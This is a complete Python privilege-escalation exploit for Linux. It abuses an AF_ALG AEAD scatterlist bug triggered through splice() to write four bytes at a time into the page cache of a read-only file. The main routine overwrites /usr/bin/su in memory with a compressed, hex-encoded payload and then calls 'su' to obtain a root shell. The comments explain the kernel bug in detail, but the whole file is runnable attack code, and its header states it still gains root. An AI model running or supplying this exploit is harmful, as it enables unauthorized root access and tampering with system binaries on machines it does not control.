#!/usr/bin/env python3
#
# WARNING:
# --------
# This is still the original exploit, only with nicer names and some
# comments.  Executing it on a vulnerable kernel will still gain root.
#

import os
import socket
import zlib

# ---------------------------------------------------------------------------
#  Convenience helpers
# ---------------------------------------------------------------------------

def hex_to_bytes(hex_string: str) -> bytes:
    """Convert an ASCII hex-encoded string to raw bytes."""
    return bytes.fromhex(hex_string)

# ---------------------------------------------------------------------------
#  Constants taken from linux/if_alg.h (hard-coded to avoid extra imports)
# ---------------------------------------------------------------------------

AF_ALG             = 38                 # Address family for the crypto API
SOCK_SEQPACKET     = socket.SOCK_SEQPACKET
SOL_ALG            = 279                # setsockopt level for AF_ALG sockets

ALG_SET_KEY        = 1                  # setsockopt option numbers
ALG_SET_IVLEN      = 2
ALG_SET_IV         = 3
ALG_SET_OP         = 4
ALG_SET_AEAD_ASSOCLEN = 5               # length of associated data

# ---------------------------------------------------------------------------
#  Primitive: write 4 bytes into the page-cache of a file
# ---------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Why is the granularity 4 bytes?
# -----------------------------------------------------------------------------
#
# In the kernel interface, the following call is made:
#
#     setsockopt(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, NULL, 4)
#
# In Python, this is equivalent to:
#
#     alg_socket.setsockopt(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, None, 4)
#
# For AEAD (Authenticated Encryption with Associated Data) algorithms,
# the "assoclen" parameter tells the kernel how many bytes of
# Associated Authentication Data (AAD) will be supplied. Here, we
# deliberately set it to 4, requesting exactly four AAD bytes.
#
# When processing AEAD operations, the kernel builds two scatter-lists:
#
#   - src-sg: [ AAD (4 bytes) | plaintext (n bytes) ]
#   - dst-sg: [ ------- same size as above ------- ]
#
# In 2017, an "in-place optimization" introduced a bug: if the data was piped
# (splice()d), the same page-cache page could be re-used as the first entry
# of both lists. As a result, the first four bytes of a page that should be
# read-only (from the file) could be placed in a destination that the kernel
# then treats as writable.
#
# During cipher execution, when the AES code writes the ciphertext/AAD/tag
# back to the dst-sg list, it overwrites those first four bytes of the
# page-cache page.
#
# Crucially, the content that gets written is the 4-byte chunk you supply
# just after the fixed "AAAA" AAD segment in the sendmsg() call.
#
# Because only the first bytes are exposed via this buggy code path, each
# invocation lets you write any four bytes at an offset you choose. The exploit
# therefore iterates as follows:
#
#     for offset in range(0, len(payload), 4):
#         write_four_bytes_into_pagecache(su_fd, offset, payload[offset:offset+4])
#
# This turns the primitive into a full-file overwrite; after all chunks are
# written, the altered /usr/bin/su can simply grant a root shell.
#
# In summary: the four bytes are attacker-controlled data written into the
# victim file. The size is four because the bug's granularity is limited to the
# initial assoclen bytes, which is set to 4 on purpose to exploit this.
# -----------------------------------------------------------------------------

def write_four_bytes_into_pagecache(file_fd: int,
                                    file_offset: int,
                                    four_byte_chunk: bytes) -> None:
    """
    Abuse the AF_ALG / splice() vulnerability to overwrite 4 bytes
    in the page-cache of the file referenced by 'file_fd'.

    Parameters
    ----------
    file_fd          : already opened file descriptor (O_RDONLY is fine).
    file_offset      : destination offset inside the file.
    four_byte_chunk  : exactly four bytes that will be written.
    """

    #
    # 1. Prepare AF_ALG socket (type AEAD with authencesn(hmac(sha256),cbc(aes))).
    #
    alg_socket = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    alg_socket.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    # 2. Program the key and misc AEAD parameters.
    null_key     = hex_to_bytes("0800010000000010" + "0" * 64)
    alg_socket.setsockopt(SOL_ALG, ALG_SET_KEY, null_key)
    alg_socket.setsockopt(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, None, 4)

    #
    # 3. Accept() gives the "operation socket" used for sendmsg().
    #
    op_socket, _ = alg_socket.accept()

    # 4. Build the scatterlist description we want the kernel to process.
    #
    iv             = hex_to_bytes("00")               # Single zero byte
    anc_data = [
        (SOL_ALG, ALG_SET_IV,            iv * 4               ),
        (SOL_ALG, ALG_SET_IVLEN,         b'\x10' + iv * 19    ),
        (SOL_ALG, ALG_SET_OP,            b'\x08' + iv * 3     ),
    ]

    op_socket.sendmsg([b"A" * 4 + four_byte_chunk],
                      anc_data,
                      32 * 1024)   # arbitrary size, must be > data

    #
    # 5. splice(): move file->pipe, then pipe->socket to create the
    #    invalid scatterlist entry that will turn the target page
    #    cache page from read-only into writable.
    #
    read_end, write_end = os.pipe()

    bytes_to_move = file_offset + 4     # We always copy 4 bytes
    os.splice(file_fd,      write_end, bytes_to_move, offset_src=0)
    os.splice(read_end, op_socket.fileno(), bytes_to_move)

    #
    # 6. Trigger the read which actually performs the corrupted write.
    #
    try:
        op_socket.recv(8 + file_offset)
    except Exception:
        # The socket closes with EPIPE once the overwrite is done.
        pass

# ---------------------------------------------------------------------------
#  Main exploit driver
# ---------------------------------------------------------------------------

def main() -> None:
    # 1. Open the file that will be patched in-place.
    su_fd = os.open("/usr/bin/su", os.O_RDONLY)

    # 2. Payload: zlib-compressed / hex-encoded  shell-code / patch / etc.
    compressed_hex_payload = (
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16"
        "999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fc"
        "acfa499979fac5190c0c0c0032c310d3"
    )
    payload = zlib.decompress(hex_to_bytes(compressed_hex_payload))

    # 3. Overwrite /usr/bin/su four bytes at a time.
    for offset in range(0, len(payload), 4):
        chunk = payload[offset:offset + 4]
        write_four_bytes_into_pagecache(su_fd, offset, chunk)

    # 4. Spawn root shell.
    os.system("su")


if __name__ == "__main__":
    main()
